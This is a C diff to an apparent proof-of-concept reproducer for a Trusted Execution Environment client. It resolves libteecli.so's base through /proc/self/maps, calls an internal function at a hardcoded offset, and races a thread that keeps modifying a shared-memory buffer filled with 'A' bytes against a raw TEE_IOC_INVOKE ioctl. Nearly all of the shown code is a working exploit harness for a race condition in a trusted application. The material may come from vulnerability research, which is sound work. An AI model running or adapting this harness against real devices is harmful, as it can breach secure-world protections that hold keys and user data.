@@ -1,8 +1,11 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#include <unistd.h>
+#include <sys/mman.h>
 #include "tee_client_api.h"
 #include "repro.h"
+#include "tee.h"
 #include <dlfcn.h>
 #include <pthread.h>
 #include <stdio.h>
@@ -22,6 +25,36 @@ void (*TEEC_FinalizeContext_impl)(TEEC_Context*);
 void (*TEEC_CloseSession_impl)(TEEC_Session*);
 TEEC_Result (*TEEC_InvokeCommand_impl)(TEEC_Session*,uint32_t,TEEC_Operation*,uint32_t*);
 TEEC_Result (*TEEC_RegisterSharedMemory_impl)(TEEC_Context*, TEEC_SharedMemory*);
+typedef TEEC_Result (*teec_pre_process_operation_impl_t)(TEEC_Context* ctx,
+            TEEC_Operation* operation,
+            struct tee_ioctl_param* params,
+            TEEC_SharedMemory* shms);
+
+//TEEC_Result (*TEEC_AllocateSharedMemory_impl)(TEEC_Context*, TEEC_SharedMemory*);
+#define teec_pre_process_operation_offset 0x2434
+
+uintptr_t get_lib_base(const char *libname) {
+    FILE *fp = fopen("/proc/self/maps", "r");
+    if (!fp) {
+        perror("fopen");
+        return 0;
+    }
+
+    char line[512];
+    while (fgets(line, sizeof(line), fp)) {
+        if (strstr(line, libname)) {
+            uintptr_t base = 0;
+            // The address range looks like "7f9a2c0000-7f9a2e0000 ..."
+            if (sscanf(line, "%lx-%*lx", &base) == 1) {
+                fclose(fp);
+                return base;
+            }
+        }
+    }
+
+    fclose(fp);
+    return 0;
+}
 
 void* mod_thread(void* arg){
     while(1){
@@ -32,6 +65,9 @@ void* mod_thread(void* arg){
 
 void send_req(TEEC_Context *context, TEEC_Session *session)
 {
+    pthread_t tid;
+
+#if EMULATE 
     void* mem_area1 = allocate_param_mem(context, 0x1000);
     void* mem_area2 = allocate_param_mem(context, 0x1000);
     
@@ -48,16 +84,101 @@ void send_req(TEEC_Context *context, TEEC_Session *session)
     op.params[1].tmpref.size =  0x100; 
     op.params[0].value.a = 4;
     op.params[0].value.b = 4;
+   
+#else
+    void* mem_area1 = allocate_param_mem(context, 0x1000);
+    void* mem_area2 = allocate_param_mem(context, 0x1000);
     
-    memset(mem_area2, 0x41, 0x90);
+    TEEC_SharedMemory shm2 = { };
+    shm2.flags = TEEC_MEM_INPUT | TEEC_MEM_OUTPUT;
+    shm2.buffer = mem_area2; // Buffer in use by application
+    shm2.size = 0x1000;
+    TEEC_Result res2 = TEEC_RegisterSharedMemory_impl(context, &shm2);
+    printf("TEEC_RegisterSharedMemory result: %x \n", res2);
+    uint32_t err_origin;
+    TEEC_Operation op;
+    memset(&op, 0, sizeof(op));
+    op.paramTypes = TEEC_PARAM_TYPES(TEEC_VALUE_INOUT,TEEC_MEMREF_TEMP_INPUT,
+                                     TEEC_NONE, TEEC_NONE);
+    printf("params: 0x%lx\n", op.paramTypes);
     
-    pthread_t tid;
+    op.params[1].tmpref.buffer = mem_area1; 
+    op.params[1].tmpref.size = 0x1000; 
+    
+    /* 
+    op.params[1].memref.parent = &shm2; 
+    op.params[1].memref.size =  shm2.size; 
+    op.params[1].memref.offset =  0; 
+    */
+    op.params[0].value.a = 4;
+    op.params[0].value.b = 4;
+	
+	memset(mem_area2, 0x41, 0x90);
+        //((char*)mem_area2)[0x20] = 0;
+    
+    if (pthread_create(&tid, NULL, mod_thread, mem_area2) != 0) {
+        perror("pthread_create failed");
+        return;
+    }
+#endif
+ 
+    
+
+#if EMULATE
+    TEEC_Result res = TEEC_InvokeCommand_impl(session, 0x100b, &op, &err_origin);
+#else
+
+#define TEEC_CONFIG_PAYLOAD_REF_COUNT 4
+    uint64_t buf[(sizeof(struct tee_ioctl_invoke_arg) +
+            TEEC_CONFIG_PAYLOAD_REF_COUNT *
+                sizeof(struct tee_ioctl_param)) /
+            sizeof(uint64_t)] = { 0 };
+    struct tee_ioctl_buf_data buf_data;
+    struct tee_ioctl_invoke_arg *arg;
+    struct tee_ioctl_param *params;
+    TEEC_Result res;
+    uint32_t eorig;
+    TEEC_SharedMemory shm[TEEC_CONFIG_PAYLOAD_REF_COUNT];
+    int rc;
+    buf_data.buf_ptr = (uintptr_t)buf;
+    buf_data.buf_len = sizeof(buf);
+
+    arg = (struct tee_ioctl_invoke_arg *)buf;
+    arg->num_params = TEEC_CONFIG_PAYLOAD_REF_COUNT;
+    params = (struct tee_ioctl_param *)(arg + 1);
+
+    arg->session = session->session_id;
+    arg->func = 0x100b;
+    
+    op.session = session;
+   
+	teec_pre_process_operation_impl_t teec_pre_process_operation_impl =
+        (teec_pre_process_operation_impl_t)((uint8_t*)get_lib_base("libteecli.so") + teec_pre_process_operation_offset);			
+ 
+    res = teec_pre_process_operation_impl(session->ctx, &op, params, shm);
+    if (res != TEEC_SUCCESS) {
+        printf("teec_pre_process_operation failed!! %x\n", res);
+        exit(-1);
+    }
+
+	strcpy(shm[1].buffer, "wtf???");
+	printf("shm: %s\n", shm[1].buffer);
+	mem_area2 = shm[1].buffer;
+	memset(mem_area2, 0x41, 0x90);
+        //((char*)mem_area2)[0x20] = 0;
+	printf("shm: %s\n", shm[1].buffer);
+    
     if (pthread_create(&tid, NULL, mod_thread, mem_area2) != 0) {
         perror("pthread_create failed");
         return;
     }
 
-    TEEC_Result res = TEEC_InvokeCommand_impl(session, 0x100b, &op, &err_origin);
+    rc = ioctl(session->ctx->fd, TEE_IOC_INVOKE, &buf_data);
+    res = arg->ret;
+    err_origin = arg->ret_origin; 
+
+#endif
+    printf("TEEC_Result: %x origin: err_origin: %x\n", res, err_origin);
 }
 
 
